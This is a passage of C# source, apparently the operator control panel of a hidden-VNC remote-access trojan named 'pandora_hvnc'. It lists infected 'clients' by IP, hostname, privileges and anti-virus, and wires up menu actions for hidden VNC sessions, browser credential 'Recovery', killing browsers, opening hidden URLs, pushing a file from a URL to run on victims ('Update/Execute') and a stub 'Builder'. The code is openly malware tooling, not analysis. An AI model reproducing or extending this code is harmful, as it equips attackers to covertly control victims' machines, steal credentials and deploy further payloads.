            this.imageList1.Images.SetKeyName(121, "kw.png");
            this.imageList1.Images.SetKeyName(122, "ky.png");
            this.imageList1.Images.SetKeyName(123, "kz.png");
            this.imageList1.Images.SetKeyName(124, "la.png");
            this.imageList1.Images.SetKeyName(125, "lb.png");
            this.imageList1.Images.SetKeyName(126, "lc.png");
            this.imageList1.Images.SetKeyName(127, "li.png");
            this.imageList1.Images.SetKeyName(128, "lk.png");
            this.imageList1.Images.SetKeyName(129, "lr.png");
            this.imageList1.Images.SetKeyName(130, "ls.png");
            this.imageList1.Images.SetKeyName(131, "lt.png");
            this.imageList1.Images.SetKeyName(132, "lu.png");
            this.imageList1.Images.SetKeyName(133, "lv.png");
            this.imageList1.Images.SetKeyName(134, "ly.png");
            this.imageList1.Images.SetKeyName(135, "ma.png");
            this.imageList1.Images.SetKeyName(136, "mc.png");
            this.imageList1.Images.SetKeyName(137, "md.png");
            this.imageList1.Images.SetKeyName(138, "me.png");
            this.imageList1.Images.SetKeyName(139, "mg.png");
            this.imageList1.Images.SetKeyName(140, "mh.png");
            this.imageList1.Images.SetKeyName(141, "mk.png");
            this.imageList1.Images.SetKeyName(142, "ml.png");
            this.imageList1.Images.SetKeyName(143, "mm.png");
            this.imageList1.Images.SetKeyName(144, "mn.png");
            this.imageList1.Images.SetKeyName(145, "mo.png");
            this.imageList1.Images.SetKeyName(146, "mp.png");
            this.imageList1.Images.SetKeyName(147, "mq.png");
            this.imageList1.Images.SetKeyName(148, "mr.png");
            this.imageList1.Images.SetKeyName(149, "ms.png");
            this.imageList1.Images.SetKeyName(150, "mt.png");
            this.imageList1.Images.SetKeyName(151, "mu.png");
            this.imageList1.Images.SetKeyName(152, "mv.png");
            this.imageList1.Images.SetKeyName(153, "mw.png");
            this.imageList1.Images.SetKeyName(154, "mx.png");
            this.imageList1.Images.SetKeyName(155, "my.png");
            this.imageList1.Images.SetKeyName(156, "mz.png");
            this.imageList1.Images.SetKeyName(157, "na.png");
            this.imageList1.Images.SetKeyName(158, "nc.png");
            this.imageList1.Images.SetKeyName(159, "ne.png");
            this.imageList1.Images.SetKeyName(160, "nf.png");
            this.imageList1.Images.SetKeyName(161, "ng.png");
            this.imageList1.Images.SetKeyName(162, "ni.png");
            this.imageList1.Images.SetKeyName(163, "nl.png");
            this.imageList1.Images.SetKeyName(164, "no.png");
            this.imageList1.Images.SetKeyName(165, "np.png");
            this.imageList1.Images.SetKeyName(166, "nr.png");
            this.imageList1.Images.SetKeyName(167, "nu.png");
            this.imageList1.Images.SetKeyName(168, "nz.png");
            this.imageList1.Images.SetKeyName(169, "om.png");
            this.imageList1.Images.SetKeyName(170, "pa.png");
            this.imageList1.Images.SetKeyName(171, "pe.png");
            this.imageList1.Images.SetKeyName(172, "pf.png");
            this.imageList1.Images.SetKeyName(173, "pg.png");
            this.imageList1.Images.SetKeyName(174, "ph.png");
            this.imageList1.Images.SetKeyName(175, "pk.png");
            this.imageList1.Images.SetKeyName(176, "pl.png");
            this.imageList1.Images.SetKeyName(177, "pm.png");
            this.imageList1.Images.SetKeyName(178, "pn.png");
            this.imageList1.Images.SetKeyName(179, "pr.png");
            this.imageList1.Images.SetKeyName(180, "ps.png");
            this.imageList1.Images.SetKeyName(181, "pt.png");
            this.imageList1.Images.SetKeyName(182, "pw.png");
            this.imageList1.Images.SetKeyName(183, "py.png");
            this.imageList1.Images.SetKeyName(184, "qa.png");
            this.imageList1.Images.SetKeyName(185, "re.png");
            this.imageList1.Images.SetKeyName(186, "ro.png");
            this.imageList1.Images.SetKeyName(187, "rs.png");
            this.imageList1.Images.SetKeyName(188, "ru.png");
            this.imageList1.Images.SetKeyName(189, "rw.png");
            this.imageList1.Images.SetKeyName(190, "sa.png");
            this.imageList1.Images.SetKeyName(191, "sb.png");
            this.imageList1.Images.SetKeyName(192, "sc.png");
            this.imageList1.Images.SetKeyName(193, "scotland.png");
            this.imageList1.Images.SetKeyName(194, "sd.png");
            this.imageList1.Images.SetKeyName(195, "se.png");
            this.imageList1.Images.SetKeyName(196, "sg.png");
            this.imageList1.Images.SetKeyName(197, "sh.png");
            this.imageList1.Images.SetKeyName(198, "si.png");
            this.imageList1.Images.SetKeyName(199, "sj.png");
            this.imageList1.Images.SetKeyName(200, "sk.png");
            this.imageList1.Images.SetKeyName(201, "sl.png");
            this.imageList1.Images.SetKeyName(202, "sm.png");
            this.imageList1.Images.SetKeyName(203, "sn.png");
            this.imageList1.Images.SetKeyName(204, "so.png");
            this.imageList1.Images.SetKeyName(205, "sr.png");
            this.imageList1.Images.SetKeyName(206, "st.png");
            this.imageList1.Images.SetKeyName(207, "sv.png");
            this.imageList1.Images.SetKeyName(208, "sy.png");
            this.imageList1.Images.SetKeyName(209, "sz.png");
            this.imageList1.Images.SetKeyName(210, "tc.png");
            this.imageList1.Images.SetKeyName(211, "td.png");
            this.imageList1.Images.SetKeyName(212, "tf.png");
            this.imageList1.Images.SetKeyName(213, "tg.png");
            this.imageList1.Images.SetKeyName(214, "th.png");
            this.imageList1.Images.SetKeyName(215, "tj.png");
            this.imageList1.Images.SetKeyName(216, "tk.png");
            this.imageList1.Images.SetKeyName(217, "tl.png");
            this.imageList1.Images.SetKeyName(218, "tm.png");
            this.imageList1.Images.SetKeyName(219, "tn.png");
            this.imageList1.Images.SetKeyName(220, "to.png");
            this.imageList1.Images.SetKeyName(221, "tr.png");
            this.imageList1.Images.SetKeyName(222, "tt.png");
            this.imageList1.Images.SetKeyName(223, "tv.png");
            this.imageList1.Images.SetKeyName(224, "tw.png");
            this.imageList1.Images.SetKeyName(225, "tz.png");
            this.imageList1.Images.SetKeyName(226, "ua.png");
            this.imageList1.Images.SetKeyName(227, "ug.png");
            this.imageList1.Images.SetKeyName(228, "um.png");
            this.imageList1.Images.SetKeyName(229, "us.png");
            this.imageList1.Images.SetKeyName(230, "uy.png");
            this.imageList1.Images.SetKeyName(231, "uz.png");
            this.imageList1.Images.SetKeyName(232, "va.png");
            this.imageList1.Images.SetKeyName(233, "vc.png");
            this.imageList1.Images.SetKeyName(234, "ve.png");
            this.imageList1.Images.SetKeyName(235, "vg.png");
            this.imageList1.Images.SetKeyName(236, "vi.png");
            this.imageList1.Images.SetKeyName(237, "vn.png");
            this.imageList1.Images.SetKeyName(238, "vu.png");
            this.imageList1.Images.SetKeyName(239, "wales.png");
            this.imageList1.Images.SetKeyName(240, "wf.png");
            this.imageList1.Images.SetKeyName(241, "ws.png");
            this.imageList1.Images.SetKeyName(242, "ye.png");
            this.imageList1.Images.SetKeyName(243, "yt.png");
            this.imageList1.Images.SetKeyName(244, "za.png");
            this.imageList1.Images.SetKeyName(245, "zm.png");
            this.imageList1.Images.SetKeyName(246, "zw.png");
            // 
            // guna2Panel1
            // 
            this.guna2Panel1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.guna2Panel1.Location = new System.Drawing.Point(0, 0);
            this.guna2Panel1.Name = "guna2Panel1";
            this.guna2Panel1.ShadowDecoration.Parent = this.guna2Panel1;
            this.guna2Panel1.Size = new System.Drawing.Size(607, 283);
            this.guna2Panel1.TabIndex = 6;
            // 
            // guna2ResizeBox1
            // 
            this.guna2ResizeBox1.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2ResizeBox1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(50)))), ((int)(((byte)(69)))));
            this.guna2ResizeBox1.FillColor = System.Drawing.Color.Gainsboro;
            this.guna2ResizeBox1.ForeColor = System.Drawing.Color.Black;
            this.guna2ResizeBox1.Location = new System.Drawing.Point(676, 284);
            this.guna2ResizeBox1.Name = "guna2ResizeBox1";
            this.guna2ResizeBox1.Size = new System.Drawing.Size(20, 20);
            this.guna2ResizeBox1.TabIndex = 5;
            this.guna2ResizeBox1.TargetControl = this;
            // 
            // ClientsOnline
            // 
            this.ClientsOnline.ForeColor = System.Drawing.Color.Gainsboro;
            this.ClientsOnline.Name = "ClientsOnline";
            this.ClientsOnline.Size = new System.Drawing.Size(51, 17);
            this.ClientsOnline.Text = "Online 0";
            // 
            // statusStrip1
            // 
            this.statusStrip1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(34)))), ((int)(((byte)(34)))), ((int)(((byte)(34)))));
            this.statusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.ClientsOnline,
            this.toolStripStatusLabel1});
            this.statusStrip1.Location = new System.Drawing.Point(0, 283);
            this.statusStrip1.Name = "statusStrip1";
            this.statusStrip1.Size = new System.Drawing.Size(607, 22);
            this.statusStrip1.TabIndex = 4;
            this.statusStrip1.Text = "statusStrip1";
            // 
            // toolStripStatusLabel1
            // 
            this.toolStripStatusLabel1.ForeColor = System.Drawing.Color.Gainsboro;
            this.toolStripStatusLabel1.Name = "toolStripStatusLabel1";
            this.toolStripStatusLabel1.Size = new System.Drawing.Size(13, 17);
            this.toolStripStatusLabel1.Text = "..";
            // 
            // contextMenuStrip1
            // 
            this.contextMenuStrip1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(23)))), ((int)(((byte)(23)))), ((int)(((byte)(23)))));
            this.contextMenuStrip1.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.testToolStripMenuItem,
            this.toolStripMenuItem1,
            this.resetScaleToolStripMenuItem,
            this.uRLHiddenToolStripMenuItem,
            this.killChromeToolStripMenuItem,
            this.updateExecuteToolStripMenuItem,
            this.toolStripSeparator1,
            this.builderToolStripMenuItem});
            this.contextMenuStrip1.Name = "contextMenuStrip1";
            this.contextMenuStrip1.RenderMode = System.Windows.Forms.ToolStripRenderMode.System;
            this.contextMenuStrip1.Size = new System.Drawing.Size(173, 164);
            // 
            // testToolStripMenuItem
            // 
            this.testToolStripMenuItem.ForeColor = System.Drawing.Color.Gainsboro;
            this.testToolStripMenuItem.Name = "testToolStripMenuItem";
            this.testToolStripMenuItem.Size = new System.Drawing.Size(172, 22);
            this.testToolStripMenuItem.Text = "HVNC ";
            this.testToolStripMenuItem.Click += new System.EventHandler(this.HVNCList_DoubleClick);
            // 
            // toolStripMenuItem1
            // 
            this.toolStripMenuItem1.ForeColor = System.Drawing.Color.Gainsboro;
            this.toolStripMenuItem1.Name = "toolStripMenuItem1";
            this.toolStripMenuItem1.Size = new System.Drawing.Size(172, 22);
            this.toolStripMenuItem1.Text = "Recovery ";
            this.toolStripMenuItem1.Click += new System.EventHandler(this.browserRecoveryToolStripMenuItem_Click);
            // 
            // resetScaleToolStripMenuItem
            // 
            this.resetScaleToolStripMenuItem.ForeColor = System.Drawing.Color.Gainsboro;
            this.resetScaleToolStripMenuItem.Name = "resetScaleToolStripMenuItem";
            this.resetScaleToolStripMenuItem.Size = new System.Drawing.Size(172, 22);
            this.resetScaleToolStripMenuItem.Text = "Reset Scale ";
            this.resetScaleToolStripMenuItem.Click += new System.EventHandler(this.resetScaleToolStripMenuItem_Click);
            // 
            // uRLHiddenToolStripMenuItem
            // 
            this.uRLHiddenToolStripMenuItem.ForeColor = System.Drawing.Color.Gainsboro;
            this.uRLHiddenToolStripMenuItem.Name = "uRLHiddenToolStripMenuItem";
            this.uRLHiddenToolStripMenuItem.Size = new System.Drawing.Size(172, 22);
            this.uRLHiddenToolStripMenuItem.Text = "URL Hidden ";
            this.uRLHiddenToolStripMenuItem.Click += new System.EventHandler(this.uRLHiddenToolStripMenuItem_Click);
            // 
            // killChromeToolStripMenuItem
            // 
            this.killChromeToolStripMenuItem.ForeColor = System.Drawing.Color.Gainsboro;
            this.killChromeToolStripMenuItem.Name = "killChromeToolStripMenuItem";
            this.killChromeToolStripMenuItem.Size = new System.Drawing.Size(172, 22);
            this.killChromeToolStripMenuItem.Text = "kill Browsers ";
            this.killChromeToolStripMenuItem.Click += new System.EventHandler(this.killChromeToolStripMenuItem_Click);
            // 
            // updateExecuteToolStripMenuItem
            // 
            this.updateExecuteToolStripMenuItem.ForeColor = System.Drawing.Color.Gainsboro;
            this.updateExecuteToolStripMenuItem.Name = "updateExecuteToolStripMenuItem";
            this.updateExecuteToolStripMenuItem.Size = new System.Drawing.Size(172, 22);
            this.updateExecuteToolStripMenuItem.Text = "Update/Execute ";
            this.updateExecuteToolStripMenuItem.Click += new System.EventHandler(this.updateExecuteToolStripMenuItem_Click);
            // 
            // toolStripSeparator1
            // 
            this.toolStripSeparator1.Name = "toolStripSeparator1";
            this.toolStripSeparator1.Size = new System.Drawing.Size(181, 6);
            // 
            // builderToolStripMenuItem
            // 
            this.builderToolStripMenuItem.ForeColor = System.Drawing.Color.Gainsboro;
            this.builderToolStripMenuItem.Name = "builderToolStripMenuItem";
            this.builderToolStripMenuItem.Size = new System.Drawing.Size(172, 22);
            this.builderToolStripMenuItem.Text = "Builder ";
            this.builderToolStripMenuItem.Click += new System.EventHandler(this.builderToolStripMenuItem_Click);
            // 
            // guna2DragControl1
            // 
            this.guna2DragControl1.TargetControl = this.panel1;
            // 
            // panel1
            // 
            this.panel1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(34)))), ((int)(((byte)(34)))), ((int)(((byte)(34)))));
            this.panel1.Controls.Add(this.ListenPort);
            this.panel1.Controls.Add(this.StatusPort);
            this.panel1.Controls.Add(this.StartPort);
            this.panel1.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.panel1.Location = new System.Drawing.Point(0, 230);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(607, 53);
            this.panel1.TabIndex = 2;
            this.panel1.Paint += new System.Windows.Forms.PaintEventHandler(this.panel1_Paint);
            // 
            // ListenPort
            // 
            this.ListenPort.BackColor = System.Drawing.Color.Transparent;
            this.ListenPort.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(33)))), ((int)(((byte)(43)))));
            this.ListenPort.BorderThickness = 3;
            this.ListenPort.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.ListenPort.DisabledState.Parent = this.ListenPort;
            this.ListenPort.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(50)))), ((int)(((byte)(69)))));
            this.ListenPort.FocusedState.Parent = this.ListenPort;
            this.ListenPort.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.ListenPort.ForeColor = System.Drawing.Color.Gainsboro;
            this.ListenPort.Location = new System.Drawing.Point(6, 22);
            this.ListenPort.Maximum = new decimal(new int[] {
            65553,
            0,
            0,
            0});
            this.ListenPort.Minimum = new decimal(new int[] {
            1025,
            0,
            0,
            0});
            this.ListenPort.Name = "ListenPort";
            this.ListenPort.ShadowDecoration.Parent = this.ListenPort;
            this.ListenPort.Size = new System.Drawing.Size(90, 30);
            this.ListenPort.TabIndex = 143;
            this.ListenPort.UpDownButtonFillColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(33)))), ((int)(((byte)(43)))));
            this.ListenPort.Value = new decimal(new int[] {
            8000,
            0,
            0,
            0});
            // 
            // StatusPort
            // 
            this.StatusPort.AutoSize = true;
            this.StatusPort.Dock = System.Windows.Forms.DockStyle.Left;
            this.StatusPort.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.StatusPort.ForeColor = System.Drawing.Color.Gainsboro;
            this.StatusPort.Location = new System.Drawing.Point(0, 0);
            this.StatusPort.Name = "StatusPort";
            this.StatusPort.Size = new System.Drawing.Size(71, 15);
            this.StatusPort.TabIndex = 142;
            this.StatusPort.Text = "Enable Port";
            // 
            // StartPort
            // 
            this.StartPort.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(28)))), ((int)(((byte)(47)))), ((int)(((byte)(62)))));
            this.StartPort.CheckedState.BorderRadius = 1;
            this.StartPort.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(28)))), ((int)(((byte)(47)))), ((int)(((byte)(62)))));
            this.StartPort.CheckedState.InnerBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(97)))), ((int)(((byte)(128)))));
            this.StartPort.CheckedState.InnerBorderRadius = 1;
            this.StartPort.CheckedState.InnerColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(97)))), ((int)(((byte)(128)))));
            this.StartPort.CheckedState.Parent = this.StartPort;
            this.StartPort.Location = new System.Drawing.Point(102, 25);
            this.StartPort.Name = "StartPort";
            this.StartPort.ShadowDecoration.Parent = this.StartPort;
            this.StartPort.Size = new System.Drawing.Size(65, 25);
            this.StartPort.TabIndex = 141;
            this.StartPort.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(48)))), ((int)(((byte)(81)))), ((int)(((byte)(107)))));
            this.StartPort.UncheckedState.BorderRadius = 1;
            this.StartPort.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(48)))), ((int)(((byte)(81)))), ((int)(((byte)(107)))));
            this.StartPort.UncheckedState.InnerBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(42)))), ((int)(((byte)(116)))), ((int)(((byte)(167)))));
            this.StartPort.UncheckedState.InnerBorderRadius = 1;
            this.StartPort.UncheckedState.InnerColor = System.Drawing.Color.FromArgb(((int)(((byte)(42)))), ((int)(((byte)(116)))), ((int)(((byte)(167)))));
            this.StartPort.UncheckedState.Parent = this.StartPort;
            this.StartPort.CheckedChanged += new System.EventHandler(this.StartPort_CheckedChanged_1);
            this.StartPort.Click += new System.EventHandler(this.HVNCListenBtn_Click_1);
            // 
            // imageList2
            // 
            this.imageList2.ImageStream = ((System.Windows.Forms.ImageListStreamer)(resources.GetObject("imageList2.ImageStream")));
            this.imageList2.TransparentColor = System.Drawing.Color.Transparent;
            this.imageList2.Images.SetKeyName(0, "connected_480px.png");
            this.imageList2.Images.SetKeyName(1, "disconnected_480px.png");
            // 
            // HVNCList
            // 
            this.HVNCList.Activation = System.Windows.Forms.ItemActivation.OneClick;
            this.HVNCList.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(34)))), ((int)(((byte)(34)))), ((int)(((byte)(34)))));
            this.HVNCList.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.HVNCList.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.columnHeader3,
            this.columnHeader2,
            this.columnHeader1,
            this.columnHeader4,
            this.columnHeader5,
            this.columnHeader7,
            this.columnHeader6,
            this.columnHeader8,
            this.columnHeader9,
            this.columnHeader10,
            this.columnHeader11});
            this.HVNCList.ContextMenuStrip = this.contextMenuStrip1;
            this.HVNCList.Dock = System.Windows.Forms.DockStyle.Fill;
            this.HVNCList.ForeColor = System.Drawing.Color.Gainsboro;
            this.HVNCList.FullRowSelect = true;
            this.HVNCList.HideSelection = false;
            this.HVNCList.LabelEdit = true;
            this.HVNCList.Location = new System.Drawing.Point(0, 0);
            this.HVNCList.Name = "HVNCList";
            this.HVNCList.Size = new System.Drawing.Size(607, 230);
            this.HVNCList.SmallImageList = this.imageList1;
            this.HVNCList.TabIndex = 7;
            this.HVNCList.UseCompatibleStateImageBehavior = false;
            this.HVNCList.View = System.Windows.Forms.View.Details;
            this.HVNCList.SelectedIndexChanged += new System.EventHandler(this.HVNCList_SelectedIndexChanged);
            // 
            // columnHeader3
            // 
            this.columnHeader3.Text = "IP Address";
            this.columnHeader3.Width = 115;
            // 
            // columnHeader2
            // 
            this.columnHeader2.Text = "Group";
            this.columnHeader2.Width = 180;
            // 
            // columnHeader1
            // 
            this.columnHeader1.Text = "Country";
            this.columnHeader1.Width = 100;
            // 
            // columnHeader4
            // 
            this.columnHeader4.Text = "Hostname";
            this.columnHeader4.Width = 170;
            // 
            // columnHeader5
            // 
            this.columnHeader5.Text = "OS";
            this.columnHeader5.Width = 112;
            // 
            // columnHeader7
            // 
            this.columnHeader7.Text = "Stub Version";
            this.columnHeader7.Width = 120;
            // 
            // columnHeader6
            // 
            this.columnHeader6.Text = "Active From";
            this.columnHeader6.Width = 158;
            // 
            // columnHeader8
            // 
            this.columnHeader8.Text = "Privileges";
            this.columnHeader8.Width = 101;
            // 
            // columnHeader9
            // 
            this.columnHeader9.Text = "Anti-Virus";
            this.columnHeader9.Width = 149;
            // 
            // columnHeader10
            // 
            this.columnHeader10.Text = "Ping";
            this.columnHeader10.Width = 272;
            // 
            // columnHeader11
            // 
            this.columnHeader11.Text = "";
            this.columnHeader11.Width = 1000;
            // 
            // HVNCListenBtn
            // 
            this.HVNCListenBtn.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
            this.HVNCListenBtn.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.portToolStripMenuItem,
            this.HVNCListenPort,
            this.toolStripSeparator3});
            this.HVNCListenBtn.Image = ((System.Drawing.Image)(resources.GetObject("HVNCListenBtn.Image")));
            this.HVNCListenBtn.Name = "HVNCListenBtn";
            this.HVNCListenBtn.Size = new System.Drawing.Size(189, 32);
            this.HVNCListenBtn.Text = "listening Port";
            this.HVNCListenBtn.Click += new System.EventHandler(this.HVNCListenBtn_Click_1);
            // 
            // portToolStripMenuItem
            // 
            this.portToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("portToolStripMenuItem.Image")));
            this.portToolStripMenuItem.Name = "portToolStripMenuItem";
            this.portToolStripMenuItem.Size = new System.Drawing.Size(160, 22);
            this.portToolStripMenuItem.Text = "Port :";
            // 
            // HVNCListenPort
            // 
            this.HVNCListenPort.Name = "HVNCListenPort";
            this.HVNCListenPort.Size = new System.Drawing.Size(100, 23);
            this.HVNCListenPort.Text = "9031";
            // 
            // toolStripSeparator3
            // 
            this.toolStripSeparator3.Name = "toolStripSeparator3";
            this.toolStripSeparator3.Size = new System.Drawing.Size(157, 6);
            // 
            // timer1
            // 
            this.timer1.Enabled = true;
            this.timer1.Interval = 500;
            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
            // 
            // FrmMain
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.Black;
            this.ClientSize = new System.Drawing.Size(607, 305);
            this.ContextMenuStrip = this.contextMenuStrip1;
            this.Controls.Add(this.HVNCList);
            this.Controls.Add(this.guna2ResizeBox1);
            this.Controls.Add(this.panel1);
            this.Controls.Add(this.guna2Panel1);
            this.Controls.Add(this.statusStrip1);
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Name = "FrmMain";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "pandora_hvnc";
            this.TransparencyKey = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(9)))), ((int)(((byte)(19)))));
            this.FormClosed += new System.Windows.Forms.FormClosedEventHandler(this.FrmMain_FormClosed);
            this.Load += new System.EventHandler(this.FrmMain_Load);
            this.statusStrip1.ResumeLayout(false);
            this.statusStrip1.PerformLayout();
            this.contextMenuStrip1.ResumeLayout(false);
            this.panel1.ResumeLayout(false);
            this.panel1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.ListenPort)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

		}

        private void HVNCList_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void updateClientToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void resetScaleToolStripMenuItem_Click(object sender, EventArgs e)
        {
			FrmVNC frmVNC = new FrmVNC();
			foreach (object selectedItem in HVNCList.SelectedItems)
			{
				_ = selectedItem;
				count = HVNCList.SelectedItems.Count;
			}
			for (int i = 0; i < count; i++)
			{
				frmVNC.Name = "VNCForm:" + Conversions.ToString(HVNCList.SelectedItems[i].GetHashCode());
				object obj = (frmVNC.Tag = HVNCList.SelectedItems[i].Tag);
				frmVNC.ResetScale();
				frmVNC.Dispose();
			}
			MessageBox.Show("Operation Completed To Selected Clients: " + count, "pandora_hvnc", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

        private void ClientOptionsStrip_Click(object sender, EventArgs e)
        {

        }

        private void uRLHiddenToolStripMenuItem_Click(object sender, EventArgs e)
        {
			try
			{
				if (HVNCList.SelectedItems.Count == 0)
				{
					MessageBox.Show("You have to select a client first! ", "pandora_hvnc", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					return;
				}
				new FrmURL().ShowDialog();
				if (!ispressed)
				{
					return;
				}
				FrmVNC frmVNC = new FrmVNC();
				foreach (object selectedItem in HVNCList.SelectedItems)
				{
					_ = selectedItem;
					count = HVNCList.SelectedItems.Count;
				}
				for (int i = 0; i < count; i++)
				{
					frmVNC.Name = "VNCForm:" + Conversions.ToString(HVNCList.SelectedItems[i].GetHashCode());
					object obj = (frmVNC.Tag = HVNCList.SelectedItems[i].Tag);
					frmVNC.hURL(saveurl);
					frmVNC.Dispose();
				}
				MessageBox.Show("Operation Completed To Selected Clients: " + count, "pandora_hvnc", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				ispressed = false;
			}
			catch (Exception)
			{
				MessageBox.Show("An Error Has Occured When Trying To Execute HiddenURL");
				Close();
			}
		}

        private void killChromeToolStripMenuItem_Click(object sender, EventArgs e)
        {
			FrmVNC frmVNC = new FrmVNC();
			foreach (object selectedItem in HVNCList.SelectedItems)
			{
				_ = selectedItem;
				count = HVNCList.SelectedItems.Count;
			}
			for (int i = 0; i < count; i++)
			{
				frmVNC.Name = "VNCForm:" + Conversions.ToString(HVNCList.SelectedItems[i].GetHashCode());
				object obj = (frmVNC.Tag = HVNCList.SelectedItems[i].Tag);
				frmVNC.KillChrome();
				frmVNC.Dispose();
			}
			MessageBox.Show("Operation Completed To Selected Clients: " + count, "pandora_hvnc", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

        private void updateExecuteToolStripMenuItem_Click(object sender, EventArgs e)
        {
			try
			{
				if (HVNCList.SelectedItems.Count == 0)
				{
					MessageBox.Show("You have to select a client first! ", "pandora_hvnc", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					return;
				}
				new FrmMassUpdate().ShowDialog();
				if (!ispressed)
				{
					return;
				}
				FrmVNC frmVNC = new FrmVNC();
				foreach (object selectedItem in HVNCList.SelectedItems)
				{
					_ = selectedItem;
					count = HVNCList.SelectedItems.Count;
				}
				for (int i = 0; i < count; i++)
				{
					frmVNC.Name = "VNCForm:" + Conversions.ToString(HVNCList.SelectedItems[i].GetHashCode());
					object obj = (frmVNC.Tag = HVNCList.SelectedItems[i].Tag);
					frmVNC.UpdateClient(MassURL);
					frmVNC.Dispose();
				}
				MessageBox.Show("Operation Completed To Selected Clients: " + count, "pandora_hvnc", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				ispressed = false;
			}
			catch (Exception)
			{
				MessageBox.Show("An Error Has Occured When Trying To Execute HiddenURL");
				Close();
			}
		}

        private void timer1_Tick(object sender, EventArgs e)
        {
			toolStripStatusLabel1.Text = "Selected " + HVNCList.SelectedItems.Count.ToString();
			GC.Collect();
        }

        private void timer2_Tick(object sender, EventArgs e)
        {

        }

        private void builderToolStripMenuItem_Click(object sender, EventArgs e)
        {
			new Builder().ShowDialog();
		}
    }
}
